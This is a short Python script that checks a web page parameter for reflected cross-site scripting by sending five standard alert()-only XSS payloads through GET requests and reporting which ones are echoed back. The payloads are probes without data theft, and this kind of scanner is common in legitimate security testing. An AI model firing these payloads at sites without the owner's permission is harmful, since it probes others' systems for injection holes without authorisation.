import requests
import random

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)'>",
    "<svg/onload=alert('XSS')>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<input type='image' src='x' onerror='alert(2)'>"
]

def test_xss(url, param):
    for payload in XSS_PAYLOADS:
        full_url = f"{url}?{param}={payload}"
        try:
            response = requests.get(full_url)
            if payload in response.text:
                print(f"XSS vulnerability detected with payload: {payload}")
            else:
                print(f"No vulnerability detected for payload: {payload}")
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")

# Contoh penggunaan:
# test_xss("http://target.com/search", "query")
